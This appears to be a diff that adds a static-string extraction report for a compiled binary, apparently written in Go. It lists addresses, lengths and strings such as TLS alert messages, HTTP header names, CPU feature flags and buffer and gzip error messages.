+0x7b56c0             0x737810             15         "record overflow"                                            rodata               rodata              
+0x7b56d0             0x739f37             21         "decompression failure"                                      rodata               rodata              
+0x7b56e0             0x73840e             17         "handshake failure"                                          rodata               rodata              
+0x7b56f0             0x73781f             15         "bad certificate"                                            rodata               rodata              
+0x7b5700             0x73ad4c             23         "unsupported certificate"                                    rodata               rodata              
+0x7b5710             0x7390dd             19         "revoked certificate"                                        rodata               rodata              
+0x7b5720             0x7390f0             19         "expired certificate"                                        rodata               rodata              
+0x7b5730             0x739103             19         "unknown certificate"                                        rodata               rodata              
+0x7b5740             0x73841f             17         "illegal parameter"                                          rodata               rodata              
+0x7b5750             0x73db6a             29         "unknown certificate authority"                              rodata               rodata              
+0x7b5760             0x736cf8             13         "access denied"                                              rodata               rodata              
+0x7b5770             0x73a575             22         "error decoding message"                                     rodata               rodata              
+0x7b5780             0x73b5bf             24         "error decrypting message"                                   rodata               rodata              
+0x7b5790             0x738abb             18         "export restriction"                                         rodata               rodata              
+0x7b57a0             0x73e47c             30         "protocol version not supported"                             rodata               rodata              
+0x7b57b0             0x73ca51             27         "insufficient security level"                                rodata               rodata              
+0x7b57d0             0x73a58b             22         "inappropriate fallback"                                     rodata               rodata              
+0x7b57e0             0x736d05             13         "user canceled"                                              rodata               rodata              
+0x7b57f0             0x737d77             16         "no renegotiation"                                           rodata               rodata              
+0x7b5800             0x738430             17         "missing extension"                                          rodata               rodata              
+0x7b5810             0x739f4c             21         "unsupported extension"                                      rodata               rodata              
+0x7b5820             0x73b5d7             24         "certificate unobtainable"                                   rodata               rodata              
+0x7b5830             0x738441             17         "unrecognized name"                                          rodata               rodata              
+0x7b5840             0x73ec58             31         "bad certificate status response"                            rodata               rodata              
+0x7b5850             0x73c316             26         "bad certificate hash value"                                 rodata               rodata              
+0x7b5860             0x739945             20         "unknown PSK identity"                                       rodata               rodata              
+0x7b5870             0x739959             20         "certificate required"                                       rodata               rodata              
+0x7b5880             0x73ad63             23         "no application protocol"                                    rodata               rodata              
+0x7b5890             0x73ec77             31         "encrypted client hello required"                            rodata               rodata              
+0x7b58a0             0x734f6b             6          "Accept"                                                     rodata               rodata              
+0x7b58b0             0x73771d             14         "Accept-Charset"                                             rodata               rodata              
+0x7b58c0             0x7378e2             15         "Accept-Encoding"                                            rodata               rodata              
+0x7b58d0             0x737c84             15         "Accept-Language"                                            rodata               rodata              
+0x7b58e0             0x736def             13         "Accept-Ranges"                                              rodata               rodata              
+0x7b58f0             0x736dd5             13         "Cache-Control"                                              rodata               rodata              
+0x7b5910             0x735d95             10         "Connection"                                                 rodata               rodata              
+0x7b5920             0x736105             10         "Content-Id"                                                 rodata               rodata              
+0x7b5930             0x7382d7             16         "Content-Language"                                           rodata               rodata              
+0x7b5940             0x7372d9             14         "Content-Length"                                             rodata               rodata              
+0x7b5950             0x73c070             25         "Content-Transfer-Encoding"                                  rodata               rodata              
+0x7b5960             0x736716             12         "Content-Type"                                               rodata               rodata              
+0x7b5970             0x734daf             6          "Cookie"                                                     rodata               rodata              
+0x7b5980             0x7349ab             4          "Date"                                                       rodata               rodata              
+0x7b5990             0x73772b             14         "Dkim-Signature"                                             rodata               rodata              
+0x7b59a0             0x7349a3             4          "Etag"                                                       rodata               rodata              
+0x7b59b0             0x735336             7          "Expires"                                                    rodata               rodata              
+0x7b59c0             0x734ae7             4          "From"                                                       rodata               rodata              
+0x7b59d0             0x734993             4          "Host"                                                       rodata               rodata              
+0x7b59e0             0x7384eb             17         "If-Modified-Since"                                          rodata               rodata              
+0x7b59f0             0x736dfc             13         "If-None-Match"                                              rodata               rodata              
+0x7b5a00             0x73664f             11         "In-Reply-To"                                                rodata               rodata              
+0x7b5a10             0x736de2             13         "Last-Modified"                                              rodata               rodata              
+0x7b5a20             0x735455             8          "Location"                                                   rodata               rodata              
+0x7b5a30             0x73610f             10         "Message-Id"                                                 rodata               rodata              
+0x7b5a40             0x736c0e             12         "Mime-Version"                                               rodata               rodata              
+0x7b5a50             0x734dc7             6          "Pragma"                                                     rodata               rodata              
+0x7b5a60             0x7356bd             8          "Received"                                                   rodata               rodata              
+0x7b5a70             0x73665a             11         "Return-Path"                                                rodata               rodata              
+0x7b5a80             0x734f71             6          "Server"                                                     rodata               rodata              
+0x7b5a90             0x735db3             10         "Set-Cookie"                                                 rodata               rodata              
+0x7b5aa0             0x73533d             7          "Subject"                                                    rodata               rodata              
+0x7b5ac0             0x735d9f             10         "User-Agent"                                                 rodata               rodata              
+0x7b5ae0             0x737c93             15         "X-Forwarded-For"                                            rodata               rodata              
+0x7b5af0             0x736c1a             12         "X-Imforwards"                                               rodata               rodata              
+0x7b5b00             0x736c26             12         "X-Powered-By"                                               rodata               rodata              
+0x7b5b10             0x735dc7             10         ":authority"                                                 rodata               rodata              
+0x7b5b20             0x735081             7          ":method"                                                    rodata               rodata              
+0x7b5b30             0x734b99             5          ":path"                                                      rodata               rodata              
+0x7b5b40             0x735088             7          ":scheme"                                                    rodata               rodata              
+0x7b5b50             0x73507a             7          ":status"                                                    rodata               rodata              
+0x7b5b60             0x737739             14         "accept-charset"                                             rodata               rodata              
+0x7b5b70             0x737cb1             15         "accept-encoding"                                            rodata               rodata              
+0x7b5b80             0x737cc0             15         "accept-language"                                            rodata               rodata              
+0x7b5b90             0x73718a             13         "accept-ranges"                                              rodata               rodata              
+0x7b5ba0             0x734f59             6          "accept"                                                     rodata               rodata              
+0x7b5bb0             0x73d198             27         "access-control-allow-origin"                                rodata               rodata              
+0x7b5bd0             0x734eed             5          "allow"                                                      rodata               rodata              
+0x7b5be0             0x737197             13         "authorization"                                              rodata               rodata              
+0x7b5bf0             0x7371a4             13         "cache-control"                                              rodata               rodata              
+0x7b5c00             0x7397c4             19         "content-disposition"                                        rodata               rodata              
+0x7b5c10             0x737dd7             16         "content-encoding"                                           rodata               rodata              
+0x7b5c20             0x7382e7             16         "content-language"                                           rodata               rodata              
+0x7b5c30             0x73732d             14         "content-length"                                             rodata               rodata              
+0x7b5c40             0x7382f7             16         "content-location"                                           rodata               rodata              
+0x7b5c50             0x7371b1             13         "content-range"                                              rodata               rodata              
+0x7b5c60             0x736842             12         "content-type"                                               rodata               rodata              
+0x7b5c70             0x734f77             6          "cookie"                                                     rodata               rodata              
+0x7b5c80             0x7349b7             4          "date"                                                       rodata               rodata              
+0x7b5c90             0x734aeb             4          "etag"                                                       rodata               rodata              
+0x7b5ca0             0x734db5             6          "expect"                                                     rodata               rodata              
+0x7b5cb0             0x73534b             7          "expires"                                                    rodata               rodata              
+0x7b5cc0             0x734aef             4          "from"                                                       rodata               rodata              
+0x7b5cd0             0x7349af             4          "host"                                                       rodata               rodata              
+0x7b5ce0             0x7356c5             8          "if-match"                                                   rodata               rodata              
+0x7b5cf0             0x7389c4             17         "if-modified-since"                                          rodata               rodata              
+0x7b5d00             0x7371be             13         "if-none-match"                                              rodata               rodata              
+0x7b5d10             0x7356d5             8          "if-range"                                                   rodata               rodata              
+0x7b5d20             0x7397d7             19         "if-unmodified-since"                                        rodata               rodata              
+0x7b5d30             0x7371cb             13         "last-modified"                                              rodata               rodata              
+0x7b5d40             0x73496f             4          "link"                                                       rodata               rodata              
+0x7b5d50             0x7356cd             8          "location"                                                   rodata               rodata              
+0x7b5d60             0x736c32             12         "max-forwards"                                               rodata               rodata              
+0x7b5d70             0x739037             18         "proxy-authenticate"                                         rodata               rodata              
+0x7b5d80             0x7397ea             19         "proxy-authorization"                                        rodata               rodata              
+0x7b5d90             0x734cf2             5          "range"                                                      rodata               rodata              
+0x7b5da0             0x735352             7          "referer"                                                    rodata               rodata              
+0x7b5db0             0x735359             7          "refresh"                                                    rodata               rodata              
+0x7b5dc0             0x736665             11         "retry-after"                                                rodata               rodata              
+0x7b5dd0             0x734f83             6          "server"                                                     rodata               rodata              
+0x7b5de0             0x736119             10         "set-cookie"                                                 rodata               rodata              
+0x7b5df0             0x73c264             25         "strict-transport-security"                                  rodata               rodata              
+0x7b5e00             0x73852f             17         "transfer-encoding"                                          rodata               rodata              
+0x7b5e10             0x736123             10         "user-agent"                                                 rodata               rodata              
+0x7b5e20             0x734af3             4          "vary"                                                       rodata               rodata              
+0x7b5e40             0x738307             16         "www-authenticate"                                           rodata               rodata              
+0x7b5eb0             0x73fc9a             32         "access-control-allow-credentials"                           rodata               rodata              
+0x7b5ec0             0x73da18             28         "access-control-allow-headers"                               rodata               rodata              
+0x7b5ed0             0x73da34             28         "access-control-allow-methods"                               rodata               rodata              
+0x7b5ef0             0x73e3af             29         "access-control-expose-headers"                              rodata               rodata              
+0x7b5f00             0x73abe7             22         "access-control-max-age"                                     rodata               rodata              
+0x7b5f10             0x73eb0c             30         "access-control-request-headers"                             rodata               rodata              
+0x7b5f20             0x73e3cc             29         "access-control-request-method"                              rodata               rodata              
+0x7b60c0             0x734f7d             6          "origin"                                                     rodata               rodata              
+0x7b6160             0x735073             7          "trailer"                                                    rodata               rodata              
+0x7b61c0             0x737ccf             15         "x-forwarded-for"                                            rodata               rodata              
+0x7b61d0             0x7389d5             17         "x-forwarded-proto"                                          rodata               rodata              
+0x7b6f00             0x734ab3             4          "avx2"                                                       rodata               rodata              
+0x7b6f20             0x734fa1             6          "avx512"                                                     rodata               rodata              
+0x7b6f40             0x7352db             7          "avx512f"                                                    rodata               rodata              
+0x7b6f60             0x735725             8          "avx512cd"                                                   rodata               rodata              
+0x7b6f80             0x73572d             8          "avx512er"                                                   rodata               rodata              
+0x7b6fa0             0x735735             8          "avx512pf"                                                   rodata               rodata              
+0x7b6fc0             0x735645             8          "avx512vl"                                                   rodata               rodata              
+0x7b6fe0             0x73563d             8          "avx512bw"                                                   rodata               rodata              
+0x7b7000             0x73573d             8          "avx512dq"                                                   rodata               rodata              
+0x7b7020             0x736173             10         "avx512ifma"                                                 rodata               rodata              
+0x7b7040             0x73617d             10         "avx512vbmi"                                                 rodata               rodata              
+0x7b7060             0x7366c8             11         "avx512vnniw"                                                rodata               rodata              
+0x7b7080             0x736c56             12         "avx5124fmaps"                                               rodata               rodata              
+0x7b70a0             0x737d29             15         "avx512vpopcntdq"                                            rodata               rodata              
+0x7b70c0             0x738357             16         "avx512vpclmulqdq"                                           rodata               rodata              
+0x7b70e0             0x736187             10         "avx512vnni"                                                 rodata               rodata              
+0x7b7100             0x736191             10         "avx512gfni"                                                 rodata               rodata              
+0x7b7120             0x73619b             10         "avx512vaes"                                                 rodata               rodata              
+0x7b7140             0x7366d3             11         "avx512vbmi2"                                                rodata               rodata              
+0x7b7160             0x736c62             12         "avx512bitalg"                                               rodata               rodata              
+0x7b7180             0x7361a5             10         "avx512bf16"                                                 rodata               rodata              
+0x7b71a0             0x73537c             7          "amxtile"                                                    rodata               rodata              
+0x7b71c0             0x735383             7          "amxint8"                                                    rodata               rodata              
+0x7b71e0             0x73538a             7          "amxbf16"                                                    rodata               rodata              
+0x7b7200             0x734ab7             4          "bmi1"                                                       rodata               rodata              
+0x7b7220             0x734abb             4          "bmi2"                                                       rodata               rodata              
+0x7b7240             0x734b03             4          "cx16"                                                       rodata               rodata              
+0x7b7260             0x734aa7             4          "erms"                                                       rodata               rodata              
+0x7b72a0             0x735391             7          "osxsave"                                                    rodata               rodata              
+0x7b72c0             0x735be6             9          "pclmulqdq"                                                  rodata               rodata              
+0x7b72e0             0x734f11             6          "popcnt"                                                     rodata               rodata              
+0x7b7300             0x734fa7             6          "rdrand"                                                     rodata               rodata              
+0x7b7320             0x734fad             6          "rdseed"                                                     rodata               rodata              
+0x7b7340             0x734aaf             4          "sse3"                                                       rodata               rodata              
+0x7b7360             0x734cac             5          "sse41"                                                      rodata               rodata              
+0x7b7380             0x734cb1             5          "sse42"                                                      rodata               rodata              
+0x7b73a0             0x734cb6             5          "ssse3"                                                      rodata               rodata              
+0x7b73c0             0x735398             7          "avxifma"                                                    rodata               rodata              
+0x7b73e0             0x73539f             7          "avxvnni"                                                    rodata               rodata              
+0x7b7400             0x7366de             11         "avxvnniint8"                                                rodata               rodata              
+0x7b7420             0x734b07             4          "sse2"                                                       rodata               rodata              
+0x7b7490             0x734953             4          "POST"                                                       rodata               rodata              
+0x7b74d0             0x7362be             11         "/index.html"                                                rodata               rodata              
+0x7b74f0             0x73494b             4          "http"                                                       rodata               rodata              
+0x7b7510             0x734b17             5          "https"                                                      rodata               rodata              
+0x7b7630             0x7371d8             13         "gzip, deflate"                                              rodata               rodata              
+0x7bce40             0x538da0             104        "UH��H��0H�l$(H�l$(H�$L�d$L�l$L�t$L�|$ H��H�<$H�t$H�L$�`��H��H�$L�d$L�l$L�t$L�|$ H�l$(H��0]�" rodata               text                
+0x9b4380             0x745eb7             47         "http: server gave HTTP response to HTTPS client"            data                 rodata              
+0x9b43c0             0x73acf0             23         "bytes.Buffer: too large"                                    data                 rodata              
+0x9b43d0             0x747c1a             54         "bytes.Buffer: reader returned negative count from Read"     data                 rodata              
+0x9b43e0             0x74a8ed             70         "bytes.Buffer: UnreadByte: previous operation was not a successful read" data                 rodata              
+0x9b4410             0x73a549             22         "gzip: invalid checksum"                                     data                 rodata              
+0x9b4420             0x7398f5             20         "gzip: invalid header"                                       data                 rodata              
+
+Total static string structures found: 1289
+================================================================================
+
+
